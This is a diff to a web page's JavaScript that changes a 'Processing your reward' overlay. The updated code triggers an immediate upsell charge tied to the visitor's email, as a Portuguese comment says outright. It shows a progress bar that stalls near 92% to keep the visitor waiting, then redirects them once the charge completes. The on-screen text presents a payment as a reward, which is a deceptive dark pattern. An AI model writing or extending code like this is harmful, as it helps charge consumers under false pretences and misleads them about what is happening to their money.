@@ -333,27 +333,23 @@
           var overlayTitle = document.getElementById('overlayTitle');
           var overlaySub = document.getElementById('overlaySub');
           var overlayCount = document.getElementById('overlayCount');
+          var overlayBar = document.getElementById('overlayBar');
           var startTs = Date.now();
           overlayTitle.textContent = 'Please wait...';
           overlaySub.textContent = 'Processing your reward. Stay on this page until it finishes.';
           overlayCount.textContent = 'Processing... do not leave this page';
           overlay.style.display = 'flex';
-          var overlayBar = document.getElementById('overlayBar');
-          // Progress bar driven by the same constant used by the charge, so it always matches
+          // Cobrança imediata: a barra avança até ~92% e só fecha quando o Worker responde
           var tick = setInterval(function () {
-            var pct = Math.min(100, ((Date.now() - startTs) / UPSELL_DELAY_MS) * 100);
-            if (overlayBar) overlayBar.style.width = pct + '%';
-            if (pct >= 100) clearInterval(tick);
-          }, 250);
-          setTimeout(function () {
+            var pct = 92 * (1 - Math.exp(-(Date.now() - startTs) / 2500));
+            if (overlayBar) overlayBar.style.width = pct.toFixed(1) + '%';
+          }, 200);
+          chargeUpsell(email, function (nextUrl) {
             clearInterval(tick);
             if (overlayBar) overlayBar.style.width = '100%';
             overlayTitle.textContent = 'Redirecting you...';
             overlaySub.textContent = 'Almost there — do not close or refresh this page.';
             overlayCount.textContent = 'Finalizing your reward...';
-          }, UPSELL_REDIRECT_AT_MS);
-          chargeUpsell(email, function (nextUrl) {
-            clearInterval(tick);
             setTimeout(function () {
               var dest = (typeof window.spWithParams === 'function') ? window.spWithParams(nextUrl) : nextUrl;
               window.top.location.href = dest;
